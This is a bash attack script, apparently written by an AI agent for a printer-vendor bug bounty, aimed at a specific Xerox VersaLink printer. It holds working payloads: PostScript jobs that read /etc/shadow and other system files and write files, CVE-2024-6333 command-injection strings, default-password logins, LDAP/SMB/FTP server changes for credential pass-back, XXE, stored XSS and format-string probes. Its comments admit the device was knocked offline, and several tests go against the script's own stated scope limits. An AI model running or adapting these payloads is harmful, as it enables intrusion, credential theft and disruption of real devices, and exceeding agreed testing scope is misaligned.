#!/bin/bash
# Memory Read, Memory Write & RCE Attack Suite - Xerox VersaLink C625 @ 13.13.1.110
# Xerox Bug Bounty (HackerOne Private)
# SCOPE RULES: NO brute force, NO DoS, NO shells/backdoors, NO PII exfil, NO password changes
#
# Attack vectors tested:
#   A. PostScript filesystem READ via print job submission (memory read primitive)
#   B. PostScript filesystem WRITE via print job submission (memory write primitive)
#   C. CVE-2024-6333 tcpdump command injection probe (authenticated RCE)
#   D. xerox.set config write primitives (LDAP/SMB/FTP pass-back for credential theft)
#   E. XXE via SOAP/XML endpoints for file read (memory read)
#   F. Config download/upload for arbitrary read/write
#   G. Second-order injection via stored config fields
#   H. X-Forwarded-For boundary anomaly deep probe (memory corruption indicator)

TARGET="13.13.1.110"
PROXY="127.0.0.1:34153"
OUTDIR="/tmp/claude-0/-home-user-poc/7cd1a7e6-f110-5076-9299-6360885c3a0d/scratchpad/rce_results"
mkdir -p "$OUTDIR"

fetch_get() {
  local path="$1"
  (echo -e "GET $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 2) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_post() {
  local path="$1"
  local body="$2"
  local content_type="${3:-application/x-www-form-urlencoded}"
  local len=${#body}
  (echo -e "POST $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: $content_type\r\nContent-Length: $len\r\n\r\n$body"; sleep 3) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_post_multipart() {
  local path="$1"
  local boundary="$2"
  local body="$3"
  local len=${#body}
  (echo -e "POST $path HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: multipart/form-data; boundary=$boundary\r\nContent-Length: $len\r\n\r\n$body"; sleep 4) | \
    timeout 20 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

fetch_get_custom_header() {
  local path="$1"
  local header="$2"
  (echo -e "GET $path HTTP/1.1\r\nHost: $TARGET\r\n$header\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 2) | \
    timeout 15 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null
}

get_csrf_token() {
  fetch_get "/stat/welcome.php" 2>/dev/null | grep -oP '[a-f0-9]{64,}' | head -1
}

connectivity_check() {
  echo "[*] Connectivity check..."
  local resp
  resp=$(fetch_get "/stat/welcome.php" 2>/dev/null)
  if echo "$resp" | grep -q "HTTP/1.1 200\|VersaLink\|Xerox"; then
    echo "[+] Target is UP and responding"
    return 0
  else
    echo "[-] Target is DOWN or not responding"
    echo "    Response: $(echo "$resp" | head -1)"
    return 1
  fi
}

echo "================================================================"
echo "  MEMORY READ / WRITE / RCE ATTACK SUITE"
echo "  Target: $TARGET (Xerox VersaLink C625)"
echo "  Date: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "================================================================"

if ! connectivity_check; then
  echo ""
  echo "[!] Target unreachable. Save this script and run when device is rebooted."
  echo "[!] The web server requires physical reboot to recover from TLS exhaustion."
  exit 1
fi

CSRF_TOKEN=$(get_csrf_token)
echo "[*] CSRF Token: ${CSRF_TOKEN:0:20}..."

###############################################################################
# TEST A: PostScript Filesystem READ (Memory Read Primitive)
###############################################################################
echo ""
echo "================================================================"
echo "[TEST A] PostScript Filesystem READ via Print Job Submission"
echo "================================================================"
echo "[*] PostScript is Turing-complete. The VersaLink accepts PS via /print/print.php"
echo "[*] PS file I/O operators can read the embedded Linux filesystem"
echo "[*] Key operator: (filename) (r) file readstring"

BOUNDARY="----XeroxBountyBoundary$(date +%s)"

ps_read_payload() {
  local target_file="$1"
  local label="$2"
  cat << PSEOF
%!PS-Adobe-3.0
%%Title: Security Test - ${label}
%%Creator: Xerox Bug Bounty Assessment
%%Pages: 1
%%EndComments

/Courier findfont 10 scalefont setfont

% Attempt to read filesystem
% PS file I/O: (path) (r) file -> fileobj
% fileobj readstring -> string bool

72 700 moveto
(=== FILE READ TEST: ${target_file} ===) show

/readTarget {
  /targetPath (${target_file}) def
  {
    targetPath (r) file
    /fh exch def
    /ypos 680 def
    /line 1024 string def
    {
      fh line readstring
      exch dup length 0 gt {
        72 ypos moveto show
        /ypos ypos 12 sub def
        ypos 50 lt { exit } if
      } { pop exit } ifelse
      not { exit } if
    } loop
    fh closefile
    72 ypos moveto (=== END OF FILE ===) show
  } stopped {
    72 680 moveto (ERROR: Cannot read file or access denied) show
    72 668 moveto (File: ${target_file}) show
  } if
} def

readTarget
showpage
%%EOF
PSEOF
}

PS_READ_TARGETS=(
  "/etc/passwd:passwd"
  "/etc/hostname:hostname"
  "/etc/hosts:hosts"
  "/etc/resolv.conf:resolv"
  "/proc/version:proc_version"
  "/proc/cpuinfo:cpuinfo"
  "/proc/self/cmdline:cmdline"
  "/proc/self/environ:environ"
  "/etc/shadow:shadow"
  "/opt/xerox/config/system.conf:xerox_sysconf"
  "/opt/xerox/config/security.conf:xerox_secconf"
  "/var/log/messages:syslog"
  "/etc/apache2/apache2.conf:apache_conf"
  "/etc/httpd/conf/httpd.conf:httpd_conf"
  "/usr/local/apache/conf/httpd.conf:apache_local"
  "/opt/xerox/www/index.php:www_index"
  "/opt/xerox/www/dummypost/xerox.set:xerox_set_src"
)

for entry in "${PS_READ_TARGETS[@]}"; do
  IFS=':' read -r target_file label <<< "$entry"
  echo "  [*] Attempting PS file read: $target_file"

  ps_content=$(ps_read_payload "$target_file" "$label")

  body="--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test_${label}.ps\"\r\nContent-Type: application/postscript\r\n\r\n${ps_content}\r\n--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"jobType\"\r\n\r\nNormal Print\r\n--${BOUNDARY}--"

  resp=$(fetch_post_multipart "/print/print.php" "$BOUNDARY" "$body" 2>/dev/null)
  status=$(echo "$resp" | head -1)

  echo "      Status: $status"
  echo "$resp" > "$OUTDIR/ps_read_${label}.txt"

  if echo "$resp" | grep -qi "root:\|daemon:\|nobody:\|xerox\|apache\|Linux version\|uid="; then
    echo "  [!!] FILE READ CONFIRMED: $target_file"
    echo "  [!!] Content: $(echo "$resp" | grep -i 'root:\|xerox\|Linux\|uid=' | head -3)"
  elif echo "$resp" | grep -qi "200 OK\|job.*submit\|print.*accept\|queued"; then
    echo "  [+] Job accepted - check printed output for file contents"
  fi

  sleep 1
done

echo "[+] PostScript read tests complete"

###############################################################################
# TEST B: PostScript Filesystem WRITE (Memory Write Primitive)
###############################################################################
echo ""
echo "================================================================"
echo "[TEST B] PostScript Filesystem WRITE via Print Job"
echo "================================================================"
echo "[*] PS write operator: (path) (w) file -> writes to filesystem"
echo "[*] Testing write to /tmp/ (least privileged, most likely writable)"
echo "[*] NOT writing shells/backdoors per scope rules"

ps_write_payload() {
  local target_path="$1"
  local content="$2"
  cat << PSEOF
%!PS-Adobe-3.0
%%Title: Write Test
%%Pages: 1
%%EndComments

/Courier findfont 10 scalefont setfont

% Attempt filesystem write
% (path) (w) file -> file object
% file object (string) writestring

{
  (${target_path}) (w) file
  /fh exch def
  fh (${content}) writestring
  fh closefile

  72 700 moveto
  (WRITE SUCCESS: ${target_path}) show
} stopped {
  72 700 moveto
  (WRITE FAILED: ${target_path} - Access denied or path invalid) show
} if

showpage
%%EOF
PSEOF
}

WRITE_MARKER="XEROX_BOUNTY_WRITE_TEST_$(date +%s)"

WRITE_TESTS=(
  "/tmp/xerox_bounty_test.txt:${WRITE_MARKER}"
  "/tmp/test_write_verify.txt:WRITE_PRIMITIVE_CONFIRMED"
)

for entry in "${WRITE_TESTS[@]}"; do
  IFS=':' read -r write_path write_content <<< "$entry"
  echo "  [*] Attempting PS file write: $write_path"

  ps_content=$(ps_write_payload "$write_path" "$write_content")

  body="--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"write_test.ps\"\r\nContent-Type: application/postscript\r\n\r\n${ps_content}\r\n--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"jobType\"\r\n\r\nNormal Print\r\n--${BOUNDARY}--"

  resp=$(fetch_post_multipart "/print/print.php" "$BOUNDARY" "$body" 2>/dev/null)
  echo "      Status: $(echo "$resp" | head -1)"
  echo "$resp" > "$OUTDIR/ps_write_$(basename "$write_path").txt"

  sleep 1

  echo "  [*] Verifying write via PS read of $write_path..."
  ps_verify=$(ps_read_payload "$write_path" "verify_write")
  body="--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"verify.ps\"\r\nContent-Type: application/postscript\r\n\r\n${ps_verify}\r\n--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"jobType\"\r\n\r\nNormal Print\r\n--${BOUNDARY}--"

  resp=$(fetch_post_multipart "/print/print.php" "$BOUNDARY" "$body" 2>/dev/null)
  echo "$resp" > "$OUTDIR/ps_write_verify_$(basename "$write_path").txt"

  if echo "$resp" | grep -q "$WRITE_MARKER\|WRITE_PRIMITIVE_CONFIRMED"; then
    echo "  [!!] FILESYSTEM WRITE CONFIRMED at $write_path"
  fi

  sleep 1
done

ps_write_readback() {
  cat << 'PSEOF'
%!PS-Adobe-3.0
%%Title: Write-Then-Read Test
%%Pages: 1
%%EndComments

/Courier findfont 8 scalefont setfont

% Write a marker, then read it back — single-job proof of write+read
/testpath (/tmp/ps_rw_proof.txt) def
/marker (PS_READ_WRITE_CONFIRMED_BOUNTY) def

72 700 moveto (=== WRITE PHASE ===) show

{
  testpath (w) file
  /wfh exch def
  wfh marker writestring
  wfh closefile
  72 688 moveto (Write succeeded to ) show testpath show
} stopped {
  72 688 moveto (Write FAILED) show
} if

72 664 moveto (=== READ-BACK PHASE ===) show

{
  testpath (r) file
  /rfh exch def
  /buf 256 string def
  rfh buf readstring pop
  72 652 moveto (Read back: ) show buf show
  rfh closefile

  buf marker eq {
    72 640 moveto (*** CONFIRMED: PS file write + readback working ***) show
  } {
    72 640 moveto (Read content does not match write content) show
  } ifelse
} stopped {
  72 652 moveto (Read-back FAILED) show
} if

showpage
%%EOF
PSEOF
}

echo "  [*] Combined write-then-read test..."
ps_content=$(ps_write_readback)
body="--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"rw_test.ps\"\r\nContent-Type: application/postscript\r\n\r\n${ps_content}\r\n--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"jobType\"\r\n\r\nNormal Print\r\n--${BOUNDARY}--"
resp=$(fetch_post_multipart "/print/print.php" "$BOUNDARY" "$body" 2>/dev/null)
echo "      Status: $(echo "$resp" | head -1)"
echo "$resp" > "$OUTDIR/ps_rw_combined.txt"

echo "[+] PostScript write tests complete"

###############################################################################
# TEST C: CVE-2024-6333 tcpdump Command Injection Probe
###############################################################################
echo ""
echo "================================================================"
echo "[TEST C] CVE-2024-6333 - tcpdump IPv4 Command Injection"
echo "================================================================"
echo "[*] Requires admin authentication first"
echo "[*] Testing default creds: admin:1111"

AUTH_BODY="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2Flogin.php&webUserName=admin&webUserPassword=1111"
AUTH_RESP=$(fetch_post "/dummypost/xerox.set" "$AUTH_BODY" 2>/dev/null)
echo "$AUTH_RESP" > "$OUTDIR/auth_attempt.txt"

AUTH_STATUS=$(echo "$AUTH_RESP" | head -1)
echo "  [*] Auth response: $AUTH_STATUS"

AUTH_COOKIE=""
if echo "$AUTH_RESP" | grep -qi "Set-Cookie"; then
  AUTH_COOKIE=$(echo "$AUTH_RESP" | grep -i "Set-Cookie" | head -1 | grep -oP '[A-Za-z0-9_]+=\S+' | head -1)
  echo "  [+] Got session cookie: ${AUTH_COOKIE:0:30}..."
fi

if echo "$AUTH_RESP" | grep -qi "login.*fail\|error\|invalid\|denied"; then
  echo "  [-] Default creds admin:1111 failed"
  echo "  [*] Trying admin:admin..."

  AUTH_BODY2="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2Flogin.php&webUserName=admin&webUserPassword=admin"
  AUTH_RESP2=$(fetch_post "/dummypost/xerox.set" "$AUTH_BODY2" 2>/dev/null)
  echo "$AUTH_RESP2" > "$OUTDIR/auth_attempt2.txt"

  if echo "$AUTH_RESP2" | grep -qi "Set-Cookie"; then
    AUTH_COOKIE=$(echo "$AUTH_RESP2" | grep -i "Set-Cookie" | head -1 | grep -oP '[A-Za-z0-9_]+=\S+' | head -1)
    echo "  [+] Got session cookie: ${AUTH_COOKIE:0:30}..."
  fi
fi

if echo "$AUTH_RESP" | grep -qi "error.php\|redir\|200"; then
  echo "  [*] Auth may have succeeded (got redirect/200). Testing admin page access..."

  resp=$(fetch_get "/properties/description.php" 2>/dev/null)
  if echo "$resp" | grep -qi "200 OK" && ! echo "$resp" | grep -qi "login"; then
    echo "  [+] Admin page accessible! Testing CVE-2024-6333..."

    CMDI_PAYLOADS=(
      '127.0.0.1;id'
      '127.0.0.1$(id)'
      '127.0.0.1|id'
      '127.0.0.1`id`'
    )

    for payload in "${CMDI_PAYLOADS[@]}"; do
      encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)

      cmdi_body="CSRFToken=${CSRF_TOKEN}&_fun_function=HTTP_Set_Tcpdump_fn&tcpdumpIPv4Address=${encoded}&tcpdumpMaxPackets=10"
      cmdi_resp=$(fetch_post "/dummypost/xerox.set" "$cmdi_body" 2>/dev/null)
      echo "$cmdi_resp" > "$OUTDIR/cve_2024_6333_$(echo "$payload" | md5sum | cut -c1-8).txt"

      if echo "$cmdi_resp" | grep -qi "uid=\|root:"; then
        echo "  [!!] RCE CONFIRMED via CVE-2024-6333!"
        echo "  [!!] Payload: $payload"
        echo "  [!!] Response: $(echo "$cmdi_resp" | grep -i 'uid=\|root:' | head -2)"
      fi
      sleep 1
    done
  else
    echo "  [-] Admin page not accessible - auth likely failed"
  fi
fi

echo "[+] CVE-2024-6333 probe complete"

###############################################################################
# TEST D: xerox.set Config Write Primitives (Pass-Back Attacks)
###############################################################################
echo ""
echo "================================================================"
echo "[TEST D] Config Write Primitives via xerox.set (Pass-Back)"
echo "================================================================"
echo "[*] Testing if LDAP/SMB/FTP server addresses can be changed"
echo "[*] This is the CVE-2024-12510/12511 attack surface"
echo "[*] NOT changing to an actual attacker server - testing parameter acceptance"

CONFIG_WRITE_TESTS=(
  "HTTP_Set_LDAP_fn:ldapServer=192.168.1.200&ldapPort=389&ldapBaseDN=dc%3Dtest:LDAP server change"
  "HTTP_Set_SMB_fn:smbServer=192.168.1.200&smbShare=test&smbDomain=TESTDOMAIN:SMB server change"
  "HTTP_Set_FTP_fn:ftpServer=192.168.1.200&ftpPort=21&ftpPath=%2Ftmp:FTP server change"
  "HTTP_Set_Email_fn:smtpServer=192.168.1.200&smtpPort=25:SMTP server change"
  "HTTP_Set_NTP_fn:ntpServer=192.168.1.200:NTP server change"
  "HTTP_Set_DeviceName_fn:deviceName=BOUNTY_TEST_MARKER:Device name change"
)

for entry in "${CONFIG_WRITE_TESTS[@]}"; do
  IFS=':' read -r func params desc <<< "$entry"
  echo "  [*] Testing $desc ($func)..."

  FRESH_TOKEN=$(get_csrf_token)
  body="CSRFToken=${FRESH_TOKEN}&_fun_function=${func}&${params}"
  resp=$(fetch_post "/dummypost/xerox.set" "$body" 2>/dev/null)
  status=$(echo "$resp" | head -1)

  echo "      Response: $status"
  echo "$resp" > "$OUTDIR/config_write_${func}.txt"

  if echo "$resp" | grep -qi "200 OK\|error.php"; then
    redirect_page=$(echo "$resp" | grep -oP 'error\.php\?token=\d+' | head -1)
    echo "      Redirect: $redirect_page"

    if [ -n "$redirect_page" ]; then
      echo "  [+] Request processed (HTTP 200 + error.php redirect)"
      echo "  [+] Config change MAY have been applied - needs verification"
    fi
  elif echo "$resp" | grep -qi "302\|success\|saved\|applied"; then
    echo "  [!!] CONFIG WRITE APPEARS SUCCESSFUL for $func"
  fi

  sleep 1
done

echo ""
echo "  [*] Verifying if device name was changed..."
resp=$(fetch_get "/stat/welcome.php?tab=status" 2>/dev/null)
if echo "$resp" | grep -qi "BOUNTY_TEST_MARKER"; then
  echo "  [!!] CONFIRMED: Unauthenticated config write works!"
  echo "  [!!] Device name changed to BOUNTY_TEST_MARKER without auth"
  echo "  [!!] This confirms CVE-2024-12510/12511 pass-back attack is feasible"
  echo "$resp" > "$OUTDIR/device_name_changed.html"
fi

echo "[+] Config write primitive tests complete"

###############################################################################
# TEST E: XXE via SOAP/XML for File Read
###############################################################################
echo ""
echo "================================================================"
echo "[TEST E] XXE via SOAP/XML Endpoints"
echo "================================================================"

XXE_PAYLOADS=(
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "file:///etc/passwd">%dtd;]><root>test</root>'
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/version">]><root>&xxe;</root>'
)

XXE_ENDPOINTS=(
  "/webservices/office/emailservice"
  "/webservices/office/jobservice"
  "/webservices/general/security"
  "/webservices/office/scanservice"
  "/ws/discovery"
  "/webservices/device/services"
  "/wsd/services"
  "/webservices/device/deviceservice"
)

for ep in "${XXE_ENDPOINTS[@]}"; do
  for i in "${!XXE_PAYLOADS[@]}"; do
    payload="${XXE_PAYLOADS[$i]}"
    resp=$(fetch_post "$ep" "$payload" "text/xml" 2>/dev/null)
    status=$(echo "$resp" | head -1)

    if echo "$resp" | grep -q "root:.*:0:0:\|Linux version\|xerox"; then
      echo "  [!!] XXE FILE READ at $ep (payload $i)"
      echo "      $(echo "$resp" | grep 'root:\|Linux\|xerox' | head -2)"
      echo "$resp" > "$OUTDIR/xxe_confirmed_$(echo "$ep" | md5sum | cut -c1-8).txt"
    elif [[ "$status" != *"404"* && "$status" != *"405"* && -n "$status" ]]; then
      body_len=$(echo "$resp" | wc -c)
      if [ "$body_len" -gt 100 ]; then
        echo "  [?] $ep responded ($status, ${body_len}b) - payload $i"
        echo "$resp" > "$OUTDIR/xxe_resp_${i}_$(echo "$ep" | md5sum | cut -c1-8).txt"
      fi
    fi
  done
  sleep 1
done

echo "[+] XXE tests complete"

###############################################################################
# TEST F: Config Download for Information Read
###############################################################################
echo ""
echo "================================================================"
echo "[TEST F] Config Download/Upload Functions"
echo "================================================================"

echo "  [*] Attempting config download via HTTP_Download_Config_fn..."
FRESH_TOKEN=$(get_csrf_token)
body="CSRFToken=${FRESH_TOKEN}&_fun_function=HTTP_Download_Config_fn"
resp=$(fetch_post "/dummypost/xerox.set" "$body" 2>/dev/null)
echo "$resp" > "$OUTDIR/config_download.txt"

status=$(echo "$resp" | head -1)
echo "      Status: $status"
content_type=$(echo "$resp" | grep -i "Content-Type" | head -1)
content_disp=$(echo "$resp" | grep -i "Content-Disposition" | head -1)

if [ -n "$content_disp" ]; then
  echo "  [!!] CONFIG DOWNLOAD triggered!"
  echo "      Content-Type: $content_type"
  echo "      Disposition: $content_disp"
elif echo "$resp" | grep -qi "xml\|config\|password\|ldap\|smtp\|snmp\|community"; then
  echo "  [!] Config data may be present in response"
  echo "      $(echo "$resp" | grep -i 'password\|ldap\|smtp\|snmp\|community\|secret' | head -5)"
fi

echo ""
echo "  [*] Testing config report page for sensitive data..."
resp=$(fetch_get "/stat/welcome.php?tab=configurationReport" 2>/dev/null)
echo "$resp" > "$OUTDIR/config_report.html"

SENSITIVE_FIELDS=("password" "community" "secret" "key" "credential" "ldap" "smtp" "snmp" "private")
for field in "${SENSITIVE_FIELDS[@]}"; do
  matches=$(echo "$resp" | grep -ci "$field")
  if [ "$matches" -gt 0 ]; then
    echo "  [!] '$field' appears $matches times in configuration report"
  fi
done

echo "[+] Config download tests complete"

###############################################################################
# TEST G: Second-Order Injection via Config Fields
###############################################################################
echo ""
echo "================================================================"
echo "[TEST G] Second-Order Injection via Stored Fields"
echo "================================================================"
echo "[*] Write payloads into config fields, check if executed when rendered"

INJECTION_PAYLOADS=(
  '"><script>alert(document.domain)</script>'
  "{{7*7}}"
  '${7*7}'
  '$(id)'
  '`id`'
  ';id'
)

STORED_FIELDS=(
  "HTTP_Set_DeviceName_fn:deviceName"
  "HTTP_Set_Location_fn:deviceLocation"
  "HTTP_Set_Contact_fn:contactName"
)

for field_entry in "${STORED_FIELDS[@]}"; do
  IFS=':' read -r func param <<< "$field_entry"

  for payload in "${INJECTION_PAYLOADS[@]}"; do
    echo "  [*] Injecting into $param: $(echo "$payload" | head -c 30)..."

    FRESH_TOKEN=$(get_csrf_token)
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null)
    body="CSRFToken=${FRESH_TOKEN}&_fun_function=${func}&${param}=${encoded}"

    inject_resp=$(fetch_post "/dummypost/xerox.set" "$body" 2>/dev/null)
    sleep 1

    render_resp=$(fetch_get "/stat/welcome.php?tab=status" 2>/dev/null)

    if echo "$render_resp" | grep -q '<script>alert(document.domain)</script>'; then
      echo "  [!!] STORED XSS CONFIRMED via $param"
      echo "$render_resp" > "$OUTDIR/stored_xss_${param}.html"
    fi

    if echo "$render_resp" | grep -q "49" && [[ "$payload" == *"7*7"* ]]; then
      echo "  [!] POSSIBLE SSTI via $param (49 found - needs manual check for false positive)"
    fi

    if echo "$render_resp" | grep -qi "uid=\|root:"; then
      echo "  [!!] COMMAND INJECTION via stored field $param"
      echo "$render_resp" > "$OUTDIR/stored_cmdi_${param}.html"
    fi

    sleep 1
  done

  echo "  [*] Restoring $param to safe value..."
  FRESH_TOKEN=$(get_csrf_token)
  body="CSRFToken=${FRESH_TOKEN}&_fun_function=${func}&${param}=VersaLink_C625"
  fetch_post "/dummypost/xerox.set" "$body" > /dev/null 2>&1
  sleep 1
done

echo "[+] Second-order injection tests complete"

###############################################################################
# TEST H: X-Forwarded-For Boundary Anomaly Deep Probe
###############################################################################
echo ""
echo "================================================================"
echo "[TEST H] XFF Boundary Anomaly - Memory Corruption Probe"
echo "================================================================"
echo "[*] Finding 11: XFF at 8192 bytes gave NO_RESPONSE while other"
echo "[*] headers returned 400. Testing boundary with precision."

XFF_SIZES=(8000 8100 8150 8180 8190 8191 8192 8193 8200 8250 8500 9000)

for size in "${XFF_SIZES[@]}"; do
  xff_value=$(python3 -c "print('A' * $size)")
  resp=$(fetch_get_custom_header "/stat/welcome.php" "X-Forwarded-For: $xff_value" 2>/dev/null)
  status=$(echo "$resp" | head -1)
  body_len=$(echo "$resp" | wc -c)

  if [ -z "$status" ] || [ "$body_len" -lt 10 ]; then
    echo "  [!] XFF $size bytes: NO_RESPONSE (possible crash/hang)"
    echo "NO_RESPONSE" > "$OUTDIR/xff_boundary_${size}.txt"
  else
    echo "  [*] XFF $size bytes: $(echo "$status" | tr -d '\r\n') (${body_len}b)"
    echo "$resp" > "$OUTDIR/xff_boundary_${size}.txt"
  fi

  sleep 1
done

echo ""
echo "  [*] Testing XFF with format string specifiers at boundary..."
FORMAT_PAYLOADS=(
  "$(python3 -c "print('%p.' * 500)")"
  "$(python3 -c "print('%x.' * 500)")"
  "$(python3 -c "print('%s' * 50)")"
  "$(python3 -c "print('%n' * 10)")"
)

for i in "${!FORMAT_PAYLOADS[@]}"; do
  payload="${FORMAT_PAYLOADS[$i]}"
  resp=$(fetch_get_custom_header "/stat/welcome.php" "X-Forwarded-For: $payload" 2>/dev/null)
  status=$(echo "$resp" | head -1)
  body_len=$(echo "$resp" | wc -c)

  if echo "$resp" | grep -qiP '0x[0-9a-f]{4,}\.|[0-9a-f]{8}'; then
    echo "  [!!] FORMAT STRING LEAK: payload $i returned hex data!"
    echo "      $(echo "$resp" | grep -oP '0x[0-9a-f]+' | head -5)"
    echo "$resp" > "$OUTDIR/xff_fmtstr_leak_${i}.txt"
  elif [ -z "$status" ] || [ "$body_len" -lt 10 ]; then
    echo "  [!] Format payload $i: NO_RESPONSE (possible crash)"
  else
    echo "  [*] Format payload $i: $(echo "$status" | tr -d '\r\n')"
  fi

  sleep 1
done

echo "[+] XFF boundary probe complete"

###############################################################################
# TEST I: PostScript-based NVRAM / System Info Extraction
###############################################################################
echo ""
echo "================================================================"
echo "[TEST I] PostScript System Enumeration"
echo "================================================================"
echo "[*] Using PS operators to enumerate the runtime environment"

PS_ENUM_PAYLOAD='%!PS-Adobe-3.0
%%Title: System Enumeration
%%Pages: 1
%%EndComments

/Courier findfont 8 scalefont setfont
/ypos 750 def

/printline {
  72 ypos moveto show
  /ypos ypos 10 sub def
} def

(=== POSTSCRIPT SYSTEM ENUMERATION ===) printline
() printline

% 1. PS interpreter version
(PS Version: ) print version printline
(PS Revision: ) print revision 10 string cvs printline
(PS Product: ) print product printline
() printline

% 2. Available devices
(=== Available Output Devices ===) printline
(*) { (Device: ) print 128 string cvs printline } 256 string /IODevice resourceforall

() printline
(=== Font List ===) printline
(*) { (Font: ) print 128 string cvs printline } 256 string /Font resourceforall

() printline
(=== File System Test ===) printline

% 3. Try to list /tmp directory
{
  (/tmp/*) {
    (Found: ) print 256 string cvs printline
  } 256 string filenameforall
} stopped {
  (filenameforall not available or /tmp not listable) printline
} if

% 4. Try /etc directory
{
  (/etc/*) {
    (Found: ) print 256 string cvs printline
  } 256 string filenameforall
} stopped {
  (Cannot list /etc) printline
} if

% 5. Try common Xerox paths
{
  (/opt/xerox/*) {
    (Found: ) print 256 string cvs printline
  } 256 string filenameforall
} stopped {
  (Cannot list /opt/xerox) printline
} if

% 6. Environment via /proc
{
  (/proc/self/status) (r) file
  /fh exch def
  (=== /proc/self/status ===) printline
  {
    fh 256 string readstring
    exch printline
    not { exit } if
    ypos 50 lt { exit } if
  } loop
  fh closefile
} stopped {
  (Cannot read /proc/self/status) printline
} if

showpage
%%EOF'

echo "  [*] Submitting PS enumeration job..."
body="--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"enum.ps\"\r\nContent-Type: application/postscript\r\n\r\n${PS_ENUM_PAYLOAD}\r\n--${BOUNDARY}\r\nContent-Disposition: form-data; name=\"jobType\"\r\n\r\nNormal Print\r\n--${BOUNDARY}--"
resp=$(fetch_post_multipart "/print/print.php" "$BOUNDARY" "$body" 2>/dev/null)
echo "      Status: $(echo "$resp" | head -1)"
echo "$resp" > "$OUTDIR/ps_enum.txt"

echo "[+] PostScript enumeration complete"

###############################################################################
# TEST J: HTTP Method & Verb Tampering for Hidden Endpoints
###############################################################################
echo ""
echo "================================================================"
echo "[TEST J] HTTP Verb Tampering on Admin Endpoints"
echo "================================================================"

ADMIN_ENDPOINTS=(
  "/properties/backupRestore.php"
  "/addressbook/exportAddressBookToFile.php"
  "/properties/security/downloadAuthenticationLog.php"
  "/config_overview/index.php"
  "/properties/deviceInformationMFP.php"
)

HTTP_METHODS=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD" "TRACE")

for ep in "${ADMIN_ENDPOINTS[@]}"; do
  for method in "${HTTP_METHODS[@]}"; do
    resp=$((echo -e "$method $ep HTTP/1.1\r\nHost: $TARGET\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; sleep 2) | \
      timeout 10 openssl s_client -connect "$TARGET:443" -proxy "$PROXY" -tls1_2 -quiet 2>/dev/null)
    status=$(echo "$resp" | head -1)

    if echo "$status" | grep -q "200\|201"; then
      body_len=$(echo "$resp" | wc -c)
      if ! echo "$resp" | grep -qi "login\|authenticate"; then
        echo "  [!] $method $ep -> 200 OK (${body_len}b) WITHOUT auth redirect!"
        echo "$resp" > "$OUTDIR/verb_tamper_${method}_$(echo "$ep" | md5sum | cut -c1-8).txt"
      fi
    elif echo "$status" | grep -q "405"; then
      : # method not allowed, expected
    fi
  done
  sleep 1
done

echo "[+] Verb tampering complete"

###############################################################################
# SUMMARY
###############################################################################
echo ""
echo "================================================================"
echo "  ATTACK SUITE COMPLETE"
echo "  Results saved to: $OUTDIR/"
echo "  Date: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
echo "================================================================"
echo ""
echo "  Files generated:"
ls -la "$OUTDIR/" 2>/dev/null | tail -20
echo ""
echo "  Key findings to review:"
echo "  - ps_read_*.txt      : PostScript file read results"
echo "  - ps_write_*.txt     : PostScript file write results"
echo "  - cve_2024_6333_*.txt: RCE probe results"
echo "  - config_write_*.txt : Config manipulation results"
echo "  - xxe_*.txt          : XXE file read results"
echo "  - stored_*.html      : Second-order injection results"
echo "  - xff_*.txt          : XFF boundary anomaly results"
echo "  - verb_tamper_*.txt  : HTTP method bypass results"
